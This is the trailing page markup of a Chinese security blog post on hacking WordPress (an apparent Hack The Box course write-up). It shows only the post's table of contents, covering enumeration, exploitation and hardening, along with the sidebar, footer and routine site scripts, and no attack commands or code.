class="toc-item toc-level-4"><a class="toc-link" href="#Plugins"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">Plugins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Themes"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">Themes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E6%B4%BB%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">插件活动枚举</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%B4%A2%E5%BC%95"><span class="toc-number">2.3.</span> <span class="toc-text">目录索引</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">2.4.</span> <span class="toc-text">User Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.1.</span> <span class="toc-text">第一方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%B0%E6%9C%89%E7%94%A8%E6%88%B7"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">现有用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%8E%B0%E6%9C%89%E7%94%A8%E6%88%B7"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">非现有用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.2.</span> <span class="toc-text">二方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-Endpoint"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">JSON Endpoint</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Login"><span class="toc-number">2.5.</span> <span class="toc-text">Login</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-POST%E8%AF%B7%E6%B1%82"><span class="toc-number">2.5.0.1.</span> <span class="toc-text">cURL - POST请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E6%95%88%E7%9A%84%E5%87%AD%E6%8D%AE-403%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE"><span class="toc-number">2.5.0.2.</span> <span class="toc-text">无效的凭据- 403禁止访问</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WPScan-Overview"><span class="toc-number">2.6.</span> <span class="toc-text">WPScan Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8WPScan"><span class="toc-number">2.7.</span> <span class="toc-text">使用WPScan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WPScan%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.8.</span> <span class="toc-text">WPScan枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8WPScan%E6%9E%9A%E4%B8%BE%E7%BD%91%E7%AB%99"><span class="toc-number">2.8.1.</span> <span class="toc-text">使用WPScan枚举网站</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WPScan%E6%9E%9A%E4%B8%BE-1"><span class="toc-number">2.8.1.1.</span> <span class="toc-text">WPScan枚举</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E6%8F%92%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">利用易受攻击的插件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8WPScan%E7%BB%93%E6%9E%9C"><span class="toc-number">3.1.1.</span> <span class="toc-text">利用WPScan结果</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84LFI"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">使用浏览器的LFI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8cURL%E7%9A%84LFI"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">使用cURL的LFI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attacking-WordPress-Users"><span class="toc-number">3.2.</span> <span class="toc-text">Attacking WordPress Users</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WordPress%E7%94%A8%E6%88%B7Bruteforce"><span class="toc-number">3.2.1.</span> <span class="toc-text">WordPress用户Bruteforce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WPscan-XMLRPC"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">WPscan - XMLRPC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Code-Execution-RCE-via-the-Theme-Editor"><span class="toc-number">3.3.</span> <span class="toc-text">Remote Code Execution (RCE) via the Theme Editor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBWordPress%E5%90%8E%E7%AB%AF"><span class="toc-number">3.3.1.</span> <span class="toc-text">攻击WordPress后端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Theme-Editor-%E4%B8%BB%E9%A2%98%E7%BC%96%E8%BE%91%E5%99%A8"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">Theme Editor 主题编辑器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E4%B8%BB%E9%A2%98"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">选择主题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Twenty-Seventeen-Theme-404-php"><span class="toc-number">3.3.1.3.</span> <span class="toc-text">Twenty Seventeen Theme - 404.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE"><span class="toc-number">3.3.1.4.</span> <span class="toc-text">RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attacking-WordPress-with-Metasploit"><span class="toc-number">3.4.</span> <span class="toc-text">Attacking WordPress with Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96WordPress%E5%BC%80%E5%8F%91"><span class="toc-number">3.4.1.</span> <span class="toc-text">自动化WordPress开发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%9C%A8%E5%90%AF%E5%8A%A8Metasploit%E6%A1%86%E6%9E%B6"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">正在启动Metasploit框架</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Search-%E6%97%A0%E5%9B%BD%E7%95%8C%E5%8C%BB%E7%94%9F%E6%90%9C%E5%AF%BB"><span class="toc-number">3.4.1.2.</span> <span class="toc-text">MSF Search 无国界医生搜寻</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E9%80%89%E6%8B%A9"><span class="toc-number">3.4.1.3.</span> <span class="toc-text">模块选择</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E9%80%89%E9%A1%B9"><span class="toc-number">3.4.1.4.</span> <span class="toc-text">模块选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%97%E8%A1%A8%E9%80%89%E9%A1%B9"><span class="toc-number">3.4.1.5.</span> <span class="toc-text">列表选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation-1"><span class="toc-number">3.4.2.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%80%89%E9%A1%B9"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">设置选项</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Measures"><span class="toc-number">4.</span> <span class="toc-text">Security Measures</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WordPress-Hardening"><span class="toc-number">4.1.</span> <span class="toc-text">WordPress Hardening</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%81%9A%E6%B3%95"><span class="toc-number">4.2.</span> <span class="toc-text">最佳做法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0"><span class="toc-number">4.3.</span> <span class="toc-text">执行定期更新</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%92%8C%E4%B8%BB%E9%A2%98%E7%AE%A1%E7%90%86"><span class="toc-number">4.4.</span> <span class="toc-text">插件和主题管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A2%9E%E5%BC%BAWordPress%E5%AE%89%E5%85%A8%E6%80%A7"><span class="toc-number">4.5.</span> <span class="toc-text">增强WordPress安全性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Sucuri-Security"><span class="toc-number">4.5.0.1.</span> <span class="toc-text">Sucuri Security</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iThemes-Security"><span class="toc-number">4.5.0.2.</span> <span class="toc-text">iThemes Security</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Wordfence-Security"><span class="toc-number">4.5.0.3.</span> <span class="toc-text">Wordfence Security</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">4.6.</span> <span class="toc-text">用户管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86"><span class="toc-number">4.7.</span> <span class="toc-text">配置管理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Skills-Assessment"><span class="toc-number">5.</span> <span class="toc-text">Skills Assessment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">6.</span> <span class="toc-text">碎碎念</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2023/10/24/HackingWordPressHTB/'
+    this.page.identifier = '/2023/10/24/HackingWordPressHTB/'
+    this.page.title = 'HackingWordPressHTB'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
